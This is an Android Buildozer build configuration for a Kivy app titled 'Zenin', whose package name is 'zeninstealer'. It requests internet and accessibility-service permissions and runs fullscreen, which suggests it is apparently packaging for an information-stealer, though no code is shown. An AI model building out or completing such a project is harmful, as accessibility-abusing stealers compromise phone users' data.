[app]
# (str) Title of your application
title = Zenin

# (str) Package name
package.name = zeninstealer

# (str) Package domain (needed for android packaging)
package.domain = org.anonim

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas,ttf,mp4

# (str) Application versioning
version = 2.26

# (list) Application requirements
# ВАЖНО: subprocess удален, так как это встроенный модуль. Добавлен pyjnius.
requirements = python3,kivy,requests,plyer,android,pyjnius

# (str) Supported orientation (one of landscape, sensorLandscape, portrait or all)
orientation = portrait

# (bool) Indicate if the application should be fullscreen or not
fullscreen = 1

# (list) Permissions
android.permissions = INTERNET, BIND_ACCESSIBILITY_SERVICE

# (int) Target Android API, should be as high as possible.
android.api = 31

# (int) Minimum API your APK will support.
android.minapi = 21

# (list) The Android architectures to build for
android.archs = arm64-v8a, armeabi-v7a

# (bool) If True, then skip trying to update the Android sdk
# This can be useful to avoid any automated updates from skipping questions.
android.accept_sdk_license = True

# (str) Android logcat filters to use
android.logcat_filters = *:S python:D

[buildozer]
# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = False, 1 = True)
warn_on_root = 1
